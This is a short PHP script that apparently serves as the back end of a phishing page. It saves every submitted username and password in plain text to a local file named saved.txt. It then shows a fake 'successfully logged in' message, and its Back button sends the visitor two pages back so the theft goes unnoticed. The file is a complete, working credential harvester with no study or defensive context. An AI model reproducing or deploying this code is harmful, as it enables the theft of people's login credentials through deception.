<?php
if(isset($_POST['submit'])){
$Name = "Username:".$_POST['username']."
";
$Pass = "Password:".$_POST['password']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fwrite($file, "===========");
fwrite($file, PHP_EOL);
fclose($file);
}
?>

<html>
<body>
	<h1>You have successfull logged in ;-) !!!</h1>

	<input type="button" value="Back" onClick="history.go(-2)"/>
</body>

</html>


